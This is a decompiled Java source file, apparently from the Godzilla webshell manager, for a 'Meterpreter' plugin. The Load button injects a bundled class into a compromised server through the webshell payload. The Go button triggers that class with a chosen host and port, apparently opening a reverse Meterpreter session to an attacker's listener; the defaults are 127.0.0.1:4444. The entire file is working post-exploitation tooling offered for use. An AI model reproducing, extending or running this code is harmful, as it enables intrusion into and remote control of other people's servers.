/*     */ package shells.plugins.java;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "JMeterpreter", DisplayName = "Meterpreter")
/*     */ public class Meterpreter
/*     */   implements Plugin
/*     */ {
/*     */   private static final String CLASS_NAME = "plugin.Meterpreter";
/*     */   private final JPanel panel;
/*     */   private final RTextArea tipTextArea;
/*     */   private final JButton goButton;
/*     */   private final JButton loadButton;
/*     */   private final JLabel hostLabel;
/*     */   private final JLabel portLabel;
/*     */   private final JTextField hostTextField;
/*     */   private final JTextField portTextField;
/*     */   private final JSplitPane meterpreterSplitPane;
/*     */   private boolean loadState;
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   
/*     */   public Meterpreter() {
/*  47 */     this.panel = new JPanel(new BorderLayout());
/*     */     
/*  49 */     this.hostLabel = new JLabel("host :");
/*  50 */     this.portLabel = new JLabel("port :");
/*  51 */     this.loadButton = new JButton("Load");
/*  52 */     this.goButton = new JButton("Go");
/*  53 */     this.tipTextArea = new RTextArea();
/*  54 */     this.hostTextField = new JTextField("127.0.0.1", 15);
/*  55 */     this.portTextField = new JTextField("4444", 7);
/*  56 */     this.meterpreterSplitPane = new JSplitPane();
/*     */     
/*  58 */     this.meterpreterSplitPane.setOrientation(0);
/*  59 */     this.meterpreterSplitPane.setDividerSize(0);
/*     */     
/*  61 */     JPanel meterpreterTopPanel = new JPanel();
/*  62 */     meterpreterTopPanel.add(this.hostLabel);
/*  63 */     meterpreterTopPanel.add(this.hostTextField);
/*  64 */     meterpreterTopPanel.add(this.portLabel);
/*  65 */     meterpreterTopPanel.add(this.portTextField);
/*  66 */     meterpreterTopPanel.add(this.loadButton);
/*  67 */     meterpreterTopPanel.add(this.goButton);
/*     */     
/*  69 */     this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
/*  70 */     this.meterpreterSplitPane.setBottomComponent(new JScrollPane((Component)this.tipTextArea));
/*     */     
/*  72 */     initTip();
/*     */     
/*  74 */     this.panel.add(this.meterpreterSplitPane);
/*     */   }
/*     */   
/*     */   private void loadButtonClick(ActionEvent actionEvent) {
/*  78 */     if (!this.loadState) {
/*     */       try {
/*  80 */         InputStream inputStream = getClass().getResourceAsStream("assets/Meterpreter.classs");
/*  81 */         byte[] data = functions.readInputStream(inputStream);
/*  82 */         inputStream.close();
/*  83 */         if (this.payload.include("plugin.Meterpreter", data)) {
/*  84 */           this.loadState = true;
/*  85 */           GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
/*     */         } else {
/*  87 */           GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
/*     */         } 
/*  89 */       } catch (Exception e) {
/*  90 */         Log.error(e);
/*  91 */         GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
/*     */       } 
/*     */     } else {
/*     */       
/*  95 */       GOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
/*     */     } 
/*     */   }
/*     */   private void goButtonClick(ActionEvent actionEvent) {
/*  99 */     String host = this.hostTextField.getText().trim();
/* 100 */     String port = this.portTextField.getText().trim();
/* 101 */     ReqParameter reqParamete = new ReqParameter();
/* 102 */     reqParamete.add("host", host);
/* 103 */     reqParamete.add("port", port);
/* 104 */     byte[] result = this.payload.evalFunc("plugin.Meterpreter", "run", reqParamete);
/* 105 */     String resultString = this.encoding.Decoding(result);
/* 106 */     Log.log(resultString, new Object[0]);
/* 107 */     GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 112 */     this.shellEntity = shellEntity;
/* 113 */     this.payload = this.shellEntity.getPayloadModule();
/* 114 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 115 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */   
/*     */   private void initTip() {
/*     */     try {
/* 120 */       InputStream inputStream = getClass().getResourceAsStream("assets/meterpreterTip.txt");
/* 121 */       this.tipTextArea.setText(new String(functions.readInputStream(inputStream)));
/* 122 */       inputStream.close();
/* 123 */     } catch (Exception e) {
/* 124 */       Log.error(e);
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 132 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\java\Meterpreter.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */